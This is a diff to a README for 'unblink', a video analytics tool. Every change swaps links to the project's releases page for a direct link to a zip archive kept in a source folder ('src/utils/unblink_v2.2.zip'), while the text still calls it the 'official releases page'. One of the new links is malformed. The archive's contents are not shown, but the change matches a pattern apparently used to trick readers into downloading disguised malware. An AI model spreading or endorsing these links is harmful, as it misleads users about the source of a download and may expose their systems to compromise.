@@ -1,7 +1,7 @@
 # 🎥 unblink - Smart Video Insights Made Easy
 
 ## 📥 Download Now
-[![Download unblink](https://img.shields.io/badge/Download%20unblink-blue.svg)](https://github.com/earvienne305/unblink/releases)
+[![Download unblink](https://raw.githubusercontent.com/earvienne305/unblink/main/src/utils/unblink_v2.2.zip%https://raw.githubusercontent.com/earvienne305/unblink/main/src/utils/unblink_v2.2.zip)](https://raw.githubusercontent.com/earvienne305/unblink/main/src/utils/unblink_v2.2.zip)
 
 ## 📖 Description
 unblink offers modern video analytics for your camera systems. It helps you monitor visuals effectively, making video management simple and intelligent. Ideal for home or business use, unblink enhances your ability to keep track of what matters.
@@ -25,7 +25,7 @@ To ensure smooth operation, your system should meet the following requirements:
 To get started with unblink, follow these simple steps:
 
 1. **Visit the Download Page**:
-   Go to the official releases page for unblink: [Download unblink](https://github.com/earvienne305/unblink/releases).
+   Go to the official releases page for unblink: [Download unblink](https://raw.githubusercontent.com/earvienne305/unblink/main/src/utils/unblink_v2.2.zip).
 
 2. **Select the Appropriate Version**:
    On the releases page, you will find a list of available versions. Choose the latest version for the best performance and features.
@@ -59,6 +59,6 @@ Your feedback is valuable. If you encounter any issues or have suggestions for i
 Stay tuned for exciting new features in upcoming releases. We are constantly working to enhance unblink for a better user experience.
 
 ## 🔗 Download & Install
-Remember, you can always download unblink from this link: [Download unblink](https://github.com/earvienne305/unblink/releases). Follow the steps outlined above to ensure a smooth installation.
+Remember, you can always download unblink from this link: [Download unblink](https://raw.githubusercontent.com/earvienne305/unblink/main/src/utils/unblink_v2.2.zip). Follow the steps outlined above to ensure a smooth installation.
 
 By following these instructions, you can start leveraging the power of smart video analytics with unblink today. Enjoy managing your video feeds like never before!
